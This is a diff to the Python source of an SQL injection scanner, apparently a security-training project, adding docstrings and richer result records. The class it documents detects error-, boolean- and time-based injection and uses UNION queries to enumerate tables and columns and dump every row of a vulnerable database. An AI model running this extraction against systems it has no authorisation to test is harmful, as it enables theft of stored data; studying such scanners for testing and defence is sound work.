@@ -1,3 +1,4 @@
+"""SQL injection scanner: detects and exploits SQLi vulnerabilities."""
 import re
 import time
 import json
@@ -31,6 +32,8 @@ from vaccine.constants import (
 
 
 class SqliScanner:
+    """Scan a URL for SQL injection vulnerabilities."""
+
     session = requests.Session()
     session.headers["User-Agent"] = USER_AGENT
 
@@ -41,6 +44,15 @@ class SqliScanner:
             output: str,
             cookies: str | None = None
     ) -> None:
+        """
+        Initialize the scanner.
+
+        Args:
+            url: Target URL to scan.
+            method: HTTP method to use (GET or POST).
+            output: Path to the JSON file where results are saved.
+            cookies: Optional cookie string (e.g. "key=val; key2=val2").
+        """
         self._set_session_cookies(cookies)
         self._url = self.validate_url(url.strip())
         self._has_query = self.has_query_params(self._url)
@@ -50,6 +62,7 @@ class SqliScanner:
         self._db_dump = dict()
 
     def _sql_injection(self) -> None:
+        """Run the full SQL injection scan on the target URL."""
         parsed_url = urlparse(self._url)
         url = urlunparse(parsed_url[:4] + ("", "",))
 
@@ -70,6 +83,13 @@ class SqliScanner:
             self._scan_query_params(url, parsed_url)
 
     def _scan_forms(self, url: str, forms: list[Tag]) -> None:
+        """
+        Test each HTML form for SQL injection.
+
+        Args:
+            url: Base URL where the forms were found.
+            forms: List of BeautifulSoup form tags to test.
+        """
         for form in forms:
             details = self.get_form_details(form)
             method = details["method"]
@@ -100,11 +120,18 @@ class SqliScanner:
             self._sqli_boolean_based(endpoint, true_data, false_data)
 
     def _scan_query_params(self, url: str, parsed_url: ParseResult) -> None:
+        """
+        Test URL query parameters for SQL injection.
+
+        Args:
+            url: Base URL without query string.
+            parsed_url: Parsed URL object containing the query string.
+        """
         query = parsed_url.query
         parsed_query = parse_qs(query)
         endpoint = {
             "url": url,
-            "method": "get",
+            "method": self._method,
         }
         base = {k: v[0] for k, v in parsed_query.items()}
         for param in parsed_query:
@@ -132,13 +159,31 @@ class SqliScanner:
             data: dict[str, str],
             payload: str,
     ) -> None:
+        """
+        Test for error-based SQL injection.
+
+        Sends a request with a malformed payload and checks if the
+        response contains a database error message.
+
+        Args:
+            endpoint: Dict with 'url' and 'method' keys.
+            data: Request parameters with the payload already injected.
+            payload: The injection string that was used (for logging).
+        """
         response = self._get_response(endpoint, data)
         content = response.text.lower()
         if self._is_error_vulnerable(content):
+            if response.request.url == endpoint["url"]:
+                request = response.request.body
+            else:
+                request = response.request.url
             record = {
                 "type": "error-based",
+                "url": endpoint["url"],
                 "vulnerable parameters": list(data.keys()),
                 "payload": payload,
+                "method": response.request.method,
+                "request": request,
                 "db": self._db,
             }
             self._archive(record)
@@ -167,6 +212,18 @@ class SqliScanner:
             true_data: dict[str, str],
             false_data: dict[str, str]
     ) -> None:
+        """
+        Test for boolean-based SQL injection.
+
+        Sends two requests with a true and a false condition and
+        compares the responses. A significant difference indicates
+        a vulnerability.
+
+        Args:
+            endpoint: Dict with 'url' and 'method' keys.
+            true_data: Parameters containing a always-true condition.
+            false_data: Parameters containing an always-false condition.
+        """
         true_response = self._get_response(endpoint, true_data)
         false_response = self._get_response(endpoint, false_data)
 
@@ -177,11 +234,23 @@ class SqliScanner:
         ).ratio()
 
         if ratio < 0.99:
+            if true_response.request.url == endpoint["url"]:
+                request = [
+                    false_response.request.body,
+                    true_response.request.body,
+                ]
+            else:
+                request = [
+                    false_response.request.url,
+                    true_response.request.url,
+                ]
             record = {
                 "type": "boolean-based",
+                "url": endpoint["url"],
                 "vulnerable parameters": list(true_data.keys()),
                 "payload": BOOLEAN_BASE[self._db],
-                "url": endpoint["url"],
+                "method": true_response.request.method,
+                "request": request,
             }
             self._archive(record)
             print(
@@ -196,24 +265,42 @@ class SqliScanner:
             data: dict[str, str],
             payload: str
     ) -> None:
+        """
+        Test for time-based blind SQL injection.
+
+        Compares the response time of a normal request against one
+        with a sleep payload. A delay of at least 1 second over the
+        baseline is considered a positive result.
+
+        Args:
+            endpoint: Dict with 'url' and 'method' keys.
+            data: Request parameters with the sleep payload injected.
+            payload: The sleep payload used (for logging).
+        """
         baseline_data = {
             k: v.replace(payload, '')
             for k, v in data.items()
         }
         baseline_start = time.time()
-        self._get_response(endpoint, baseline_data, timeout=8)
+        response = self._get_response(endpoint, baseline_data, timeout=8)
         baseline_delay = time.time() - baseline_start
 
         start = time.time()
-        self._get_response(endpoint, data, timeout=8)
+        response = self._get_response(endpoint, data, timeout=8)
         delay = time.time() - start
 
         if delay >= baseline_delay+1:
+            if response.request.url == endpoint["url"]:
+                request = response.request.body
+            else:
+                request = response.request.url
             record = {
                 "type": "time-based",
+                "url": endpoint["url"],
                 "vulnerable parameters": list(data.keys()),
                 "payload": payload,
-                "url": endpoint["url"],
+                "method": response.request.method,
+                "request": request,
             }
             self._archive(record)
             print(
@@ -227,6 +314,16 @@ class SqliScanner:
         endpoint: dict[str, str],
         data: dict[str, str],
     ) -> None:
+        """
+        Perform union-based extraction to dump the database.
+
+        Determines the column count, finds an injectable column,
+        then fetches table names, column names and all row data.
+
+        Args:
+            endpoint: Dict with 'url' and 'method' keys.
+            data: Clean request parameters (without injection chars).
+        """
         union_ctx = dict()
         union_ctx["endpoint"] = endpoint
         union_ctx["data"] = data
@@ -237,7 +334,10 @@ class SqliScanner:
                 self._dump_database(union_ctx)
                 record = {
                     "type": "union-based (dump)",
-                    "data": self._db_dump
+                    "url": endpoint["url"],
+                    "vulnerable parameters": list(data.keys()),
+                    "method": endpoint["method"].upper(),
+                    "data": self._db_dump,
                 }
                 self._archive(record)
                 print(
@@ -245,6 +345,18 @@ class SqliScanner:
                     f"Results saved to: {self._output}{RESET}")
 
     def _set_column_count(self, union_ctx: dict[str, Any]) -> int:
+        """
+        Find the number of columns in the vulnerable query.
+
+        Tries UNION SELECT with increasing NULL counts until no
+        column mismatch error is returned.
+
+        Args:
+            union_ctx: Shared dict holding endpoint, data, and results.
+
+        Returns:
+            1 if the column count was found, 0 otherwise.
+        """
         for key, value in union_ctx["data"].items():
             for n in range(1, 19):
                 cols = ["NULL"] * n
@@ -263,6 +375,18 @@ class SqliScanner:
         return 0
 
     def _find_injectable_column(self, union_ctx: dict[str, Any]) -> int:
+        """
+        Find a column whose value is reflected in the response.
+
+        Replaces each column one by one with the marker string
+        'vaccine' and checks if it appears in the page output.
+
+        Args:
+            union_ctx: Shared dict holding endpoint, data, and results.
+
+        Returns:
+            1 if a reflected column was found, 0 otherwise.
+        """
         cols_len = len(union_ctx["cols"])
         filler = "0" if self._db == "sqlite" else "NULL"
         for i in range(cols_len):
@@ -283,6 +407,15 @@ class SqliScanner:
         return 0
 
     def _fetch_tables(self, union_ctx: dict[str, Any]) -> None:
+        """
+        Retrieve table names from the database via UNION injection.
+
+        Populates union_ctx['tables'] and initialises self._db_dump
+        with the discovered database and table names.
+
+        Args:
+            union_ctx: Shared dict holding endpoint, data, and results.
+        """
         cols = union_ctx["cols"]
         injec_col = union_ctx["injec_col"]
         key = union_ctx["key"]
@@ -313,6 +446,14 @@ class SqliScanner:
             self._db_dump.setdefault(db, {})[tb] = []
 
     def _fetch_columns(self, union_ctx: dict[str, Any]) -> None:
+        """
+        Retrieve column names for each discovered table.
+
+        Updates self._db_dump by adding column names under each table.
+
+        Args:
+            union_ctx: Shared dict holding endpoint, data, and results.
+        """
         cols = union_ctx["cols"]
         injec_col = union_ctx["injec_col"]
         key = union_ctx["key"]
@@ -354,6 +495,15 @@ class SqliScanner:
                     self._db_dump["main"][tb].append(column)
 
     def _dump_database(self, union_ctx: dict[str, Any]) -> None:
+        """
+        Dump all rows from every discovered table.
+
+        Updates self._db_dump with the full row data for each table,
+        using markers to extract values from the HTTP response.
+
+        Args:
+            union_ctx: Shared dict holding endpoint, data, and results.
+        """
         cols = union_ctx["cols"]
         injec_col = union_ctx["injec_col"]
         key = union_ctx["key"]
@@ -365,7 +515,9 @@ class SqliScanner:
                 if self._db == "mysql":
                     cols[injec_col] = cols[injec_col].format(
                         start=START,
-                        columns=",'|',".join(cl),
+                        columns=",'|',".join(
+                            f"COALESCE({c},'')" for c in cl
+                        ),
                         end=END,
                     )
                     line_count = self._get_line_count(union_ctx, db, tb)
@@ -411,6 +563,17 @@ class SqliScanner:
             db: str,
             tb: str
     ) -> int:
+        """
+        Get the number of rows in a MySQL table via COUNT(*).
+
+        Args:
+            union_ctx: Shared dict holding endpoint, data, and results.
+            db: Database name.
+            tb: Table name.
+
+        Returns:
+            Number of rows in the table, or 0 if not found.
+        """
         cols = list(union_ctx["cols"])
         injec_col = union_ctx["injec_col"]
         key = union_ctx["key"]
@@ -431,6 +594,17 @@ class SqliScanner:
         return 0
 
     def _is_error_vulnerable(self, content: str) -> bool:
+        """
+        Check if a response contains a known database error message.
+
+        Also sets self._db to the detected database engine.
+
+        Args:
+            content: Lowercased HTTP response body to inspect.
+
+        Returns:
+            True if a database error was found, False otherwise.
+        """
         for db, errors in ERROR_BASED.items():
             for error in errors:
                 if error in content:
@@ -439,11 +613,28 @@ class SqliScanner:
         return False
 
     def _is_same_netloc(self, link: str) -> bool:
+        """
+        Check if a link belongs to the same host as the target URL.
+
+        Args:
+            link: URL to compare against the target.
+
+        Returns:
+            True if both URLs share the same network location.
+        """
         if urlparse(link).netloc == urlparse(self._url).netloc:
             return True
         return False
 
     def _archive(self, details: dict[str, Any]) -> None:
+        """
+        Append a result record to the JSON output file.
+
+        Creates the file if it does not exist yet.
+
+        Args:
+            details: Dict containing the vulnerability details to save.
+        """
         try:
             with open(self._output, "r") as file:
                 data = json.load(file)
@@ -454,6 +645,13 @@ class SqliScanner:
             json.dump(data, file, indent=2)
 
     def _set_session_cookies(self, cookies: str | None = None) -> None:
+        """
+        Parse a cookie string and add each cookie to the session.
+
+        Args:
+            cookies: Cookie string formatted as "key=val; key2=val2".
+                     Ignored if None.
+        """
         if cookies:
             for pair in cookies.split(";"):
                 if "=" in pair:
@@ -462,6 +660,15 @@ class SqliScanner:
 
     @staticmethod
     def get_forms(url: str) -> list[Tag]:
+        """
+        Fetch a page and return all its HTML form tags.
+
+        Args:
+            url: URL of the page to parse.
+
+        Returns:
+            List of BeautifulSoup Tag objects for each <form>.
+        """
         try:
             res = SqliScanner.session.get(url, timeout=10).content
         except RequestException as e:
@@ -474,6 +681,15 @@ class SqliScanner:
 
     @staticmethod
     def get_form_details(form: Tag) -> dict[str, Any]:
+        """
+        Extract useful attributes from an HTML form tag.
+
+        Args:
+            form: BeautifulSoup Tag representing a <form> element.
+
+        Returns:
+            Dict with keys 'action', 'method', and 'inputs'.
+        """
         details = dict()
         action = form.attrs.get("action", "")
         method = form.attrs.get("method", "get").lower()
@@ -494,6 +710,18 @@ class SqliScanner:
 
     @staticmethod
     def get_form_data(details: dict[str, Any], payload: str) -> dict[str, str]:
+        """
+        Build a request data dict from form details with a payload.
+
+        The payload is appended to every non-submit input value.
+
+        Args:
+            details: Form details as returned by get_form_details().
+            payload: SQL injection string to inject into inputs.
+
+        Returns:
+            Dict mapping input names to their values with the payload.
+        """
         data = dict()
         for input_tag in details["inputs"]:
             name = input_tag["name"]
@@ -513,6 +741,17 @@ class SqliScanner:
             data: dict[str, str],
             timeout: int = 20,
     ) -> Response:
+        """
+        Send an HTTP request and return the response.
+
+        Args:
+            endpoint: Dict with 'url' (str) and 'method' (str) keys.
+            data: Parameters sent as query string (GET) or body (POST).
+            timeout: Request timeout in seconds (default: 20).
+
+        Returns:
+            The HTTP Response object, or an empty Response on error.
+        """
         method = endpoint["method"]
         url = endpoint["url"]
         response = Response()
@@ -536,12 +775,34 @@ class SqliScanner:
 
     @staticmethod
     def has_query_params(url: str) -> bool:
+        """
+        Check if a URL contains a query string.
+
+        Args:
+            url: URL to inspect.
+
+        Returns:
+            True if the URL has query parameters, False otherwise.
+        """
         if urlparse(url).query:
             return True
         return False
 
     @staticmethod
     def validate_url(url: str) -> str:
+        """
+        Validate and normalise a URL.
+
+        Args:
+            url: URL string to validate.
+
+        Returns:
+            The normalised URL string.
+
+        Raises:
+            ValueError: If the URL is missing a scheme or host,
+                        or uses a scheme other than http/https.
+        """
         parsed = urlparse(url)
         has_value = all([parsed.scheme, parsed.netloc])
 
@@ -560,6 +821,18 @@ class SqliScanner:
 
     @staticmethod
     def validate_method(method: str) -> str:
+        """
+        Validate the HTTP method.
+
+        Args:
+            method: HTTP method string to validate (case-insensitive).
+
+        Returns:
+            The method in lowercase.
+
+        Raises:
+            ValueError: If the method is not GET or POST.
+        """
         if method not in HTTP_METHODS:
             raise ValueError(
                 f"{method}: invalid HTTP method, "
